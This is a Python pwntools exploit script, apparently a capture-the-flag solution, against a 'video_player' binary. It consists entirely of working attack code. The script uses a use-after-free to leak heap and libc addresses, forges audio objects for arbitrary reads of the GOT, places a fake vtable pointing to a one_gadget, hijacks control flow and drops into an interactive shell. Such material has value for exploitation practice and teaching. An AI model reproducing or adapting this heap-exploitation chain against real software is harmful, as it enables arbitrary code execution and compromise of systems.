from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./video_player"
bin = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

conn = process(file, env=env)
#gdb.attach(conn)

def menu(choice, idx = None):
    conn.recvuntil(">>>")
    conn.sendline(str(choice))
    if idx is not None:
        conn.recvuntil("Enter index")
        conn.sendline(str(idx))

def clip_menu(choice):
    conn.recvuntil(">>>")
    conn.sendline(str(choice))

def add_video(res, fps, no, data, desc):
    """       8    4    4   no    0x2f
    malloc(0x50)
    """
    menu(1)
    clip_menu(1)
    conn.recvuntil("Video Resolution")
    conn.send(res)
    conn.recvuntil("FPS :")
    conn.send(fps)
    conn.recvuntil("Number of Frames")
    conn.send(p32(no))
    conn.recvuntil("Video Data")
    conn.send(data)
    conn.recvuntil("Add description")
    conn.send(desc)

def add_audio(bitrate, length, data, desc):
    """        2        4      length 0x2f
    malloc(0x48)
    """
    menu(1)
    clip_menu(2)
    conn.recvuntil("Audio Bitrate")
    conn.send(bitrate)
    conn.recvuntil("Audio Length")
    conn.send(p32(length))
    conn.recvuntil("Audio Data")
    conn.send(data)
    conn.recvuntil("Add description")
    conn.send(desc)

def add_sub(length, subtitle, lang=None):
    """     4       length    4
    malloc(0x18)
    """
    menu(1)
    clip_menu(3)
    if lang is not None:
        conn.recvuntil("Subtitle Language")
        conn.send(lang)
    conn.recvuntil("Subtitle Length")
    conn.send(p32(length))
    conn.recvuntil("Add Subtitle")
    conn.send(subtitle)

def add_meta(date, owner):
    """      0x1f  0x1f
    malloc(0x48)
    """
    menu(1)
    clip_menu(4)
    conn.recvuntil("Date of Creation")
    conn.send(date)
    conn.recvuntil("Owner")
    conn.send(owner)

def edit_video(idx, res, fps, no, data, desc):
    menu(2, idx)
    conn.recvuntil("Video Resolution")
    conn.send(res)
    conn.recvuntil("FPS :")
    conn.send(fps)
    conn.recvuntil("Number of Frames")
    conn.send(p32(no))
    conn.recvuntil("Video Data")
    conn.send(data) # UAF
    conn.recvuntil("Edit description")
    conn.send(desc)

def edit_audio(idx, bitrate, length, data, desc):
    menu(2, idx)
    conn.recvuntil("Audio Bitrate")
    conn.send(bitrate)
    conn.recvuntil("Audio Length")
    conn.send(p32(length))
    # Free earlier data and malloc again
    conn.recvuntil("Audio Data")
    conn.send(data)
    conn.recvuntil("Edit description")
    conn.send(desc)

def edit_sub(idx, lang, data):
    menu(2, idx)
    conn.recvuntil("New Language")
    conn.send(lang)
    conn.recvuntil("Edit data")
    conn.send(data)

def edit_meta(idx, date, owner):
    menu(2, idx)
    conn.recvuntil("Date of Creation")
    conn.send(date)
    conn.recvuntil("Owner")
    conn.send(owner)

def play_video(idx, l):
    menu(3, idx)
    conn.recvuntil("Playing video...\n")
    leak = conn.recvn(l)
    res = ""
    for i in leak:
        res += chr(ord(i) ^ 0xcc)
    return res

def play_audio(idx):
    """ Leaks only if integer is two char """
    menu(3, idx)
    conn.recvuntil(": ")

def delete(idx):
    """free(...); sets to 0"""
    menu(4, idx)

conn.recvuntil("What is your movie name?\n")
conn.sendline("vampire")

# Leaking heap address
add_video("a", "b", 10, "aa", "bb") # 0

add_video("a", "b", 10, "aa", "bb") # 1
edit_video(0, "a", "b", 0x48, p64(0) + "\x00"*0x40, "bb")
add_audio("a", 10, "data", "desc") # 2
leak = play_video(0, 0x48)
heap_leak = u64(leak[0x10:0x18])

delete(0) # Audio chunk at 2 will be cleared

audio_real_vtable = 0x402938

def a_read(addr, l, j):
    res = ""
    for i in range(l):
        # Rewriting the fake audio chunk
        fake_audio_chunk = p64(audio_real_vtable) + \
                           p32(0) + \
                           p32(0) + \
                           p64(addr) + \
                           "desc"
        add_sub(0x48, fake_audio_chunk, lang="a") # j
        play_audio(2)
        leak = conn.recvline().strip()
        res += chr(int(leak) ^ 0x55)
        delete(j)
        j += 1
        addr += 1
    return res

read_addr = u64(a_read(bin.got['read'], 8, 3))

# Putting a vtable at a known address
one_gadget_addr = read_addr - libc.symbols['read'] + 0xf1117
fake_vtable = p64(one_gadget_addr)*4

add_video("a", "b", 10, "aa", "bb") # 11
edit_video(11, "a", "b", 0x48, "\x00"*0x48, "bb")
add_audio("a", 8*4, fake_vtable, "desc") # 12
leak = play_video(11, 0x48)
fake_vtable_addr = u64(leak[0x10:0x18])

delete(11) # Audio chunk at 12 will be cleared

# Controlling RIP
fake_audio_chunk = p64(fake_vtable_addr)
add_sub(0x48, fake_audio_chunk, lang="a")
#pause()
play_audio(12)

log.info("Heap leak: " + hex(heap_leak))
log.info("Read addr: " + hex(read_addr))

conn.interactive()
